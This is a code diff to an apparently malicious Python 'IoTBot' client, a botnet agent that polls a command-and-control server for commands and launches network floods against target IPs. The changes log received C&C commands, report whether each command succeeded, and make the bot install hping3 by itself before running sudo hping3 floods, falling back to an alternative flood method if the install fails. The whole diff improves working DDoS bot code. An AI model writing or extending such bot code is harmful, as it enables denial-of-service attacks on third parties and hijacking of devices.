@@ -99,6 +99,7 @@ class IoTBot:
                 command_data = response.json()
                 if command_data and command_data.get('command_id') != self.last_command_id:
                     self.last_command_id = command_data.get('command_id')
+                    self.log(f"Received command: {command_data}")
                     return command_data
             return None
             
@@ -449,8 +450,10 @@ class IoTBot:
                 
                 if tool == 'hping3':
                     if not self.check_tool_availability('hping3'):
-                        self.log("hping3 not available, using alternative flood method")
-                        return self.execute_alternative_flood(args[-1])  # Last arg is target IP
+                        self.log("hping3 not available, attempting to install...")
+                        if not self.install_hping3():
+                            self.log("Failed to install hping3, using alternative flood method")
+                            return self.execute_alternative_flood(args[-1])  # Last arg is target IP
                     
                     try:
                         cmd = ['sudo', 'hping3'] + args
@@ -523,8 +526,12 @@ class IoTBot:
                 command_data = self.get_command_from_cnc()
                 
                 if command_data and command_data.get('command'):
-                    self.log(f"Received command: {command_data}")
-                    self.execute_command(command_data)
+                    self.log(f"Executing command: {command_data}")
+                    success = self.execute_command(command_data)
+                    if success:
+                        self.log("Command executed successfully")
+                    else:
+                        self.log("Failed to execute command")
                 
                 time.sleep(self.check_interval)
                 
